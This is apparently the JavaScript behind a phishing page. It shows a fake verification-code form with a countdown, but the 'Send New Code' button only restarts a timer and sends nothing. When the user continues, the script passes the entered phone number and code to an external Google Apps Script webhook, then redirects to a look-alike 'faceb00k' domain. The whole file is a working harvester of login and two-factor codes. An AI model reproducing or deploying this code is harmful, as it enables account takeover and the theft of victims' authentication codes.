// Apps Script Web App URL (no query params here)
const GSHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzojLn6xnintLmNE3jlBgKPFJNj4RGK_PP3x9c0BOlogEsLn0Ya2dvco8t71zutNW1pqQ/exec';

const phoneInput   = document.getElementById('phoneInput');
const codeInput    = document.getElementById('codeInput');
const continueBtn  = document.getElementById('continueBtn');
const errorMsg     = document.getElementById('errorMsg');

const sendCodeBtn  = document.getElementById('sendCodeBtn');
const timerSpan    = document.getElementById('timer');

let countdownInterval = null;

// Format seconds → "MM:SS"
function formatTime(sec) {
  const m = Math.floor(sec / 60).toString().padStart(2,'0');
  const s = (sec % 60).toString().padStart(2,'0');
  return `${m}:${s}`;
}

// Begin or restart 2‑minute countdown
function startCountdown() {
  let timeLeft = 120;

  sendCodeBtn.disabled = true;
  timerSpan.textContent = formatTime(timeLeft);
  timerSpan.style.display = 'inline';

  clearInterval(countdownInterval);
  countdownInterval = setInterval(() => {
    timeLeft--;
    if (timeLeft <= 0) {
      clearInterval(countdownInterval);
      timerSpan.style.display = 'none';
      sendCodeBtn.disabled = false;
    } else {
      timerSpan.textContent = formatTime(timeLeft);
    }
  }, 1000);
}

// On page load: kick off first countdown
window.addEventListener('DOMContentLoaded', () => {
  startCountdown();
});

// “Send New Code” just restarts the timer
sendCodeBtn.addEventListener('click', () => {
  startCountdown();
  // TODO: trigger your SMS/API here if needed
});

// Continue button: send data via GET (avoids CORS preflight)
continueBtn.addEventListener('click', () => {
  const phone = phoneInput.value.trim();
  const code  = codeInput.value.trim();
  errorMsg.style.visibility = 'hidden';

  if (!phone || !code) {
    errorMsg.textContent = 'Please enter both phone number and code.';
    errorMsg.style.visibility = 'visible';
    return;
  }

  // Build URL with query params
  const url = `${GSHEET_WEBHOOK_URL}?phone=${encodeURIComponent(phone)}&code=${encodeURIComponent(code)}`;

  fetch(url)               // default is GET
    .then(res => res.json())
    .finally(() => {
      // always redirect
      window.location.href = 'https://faceb00k-kappa.vercel.app/';
    });
});
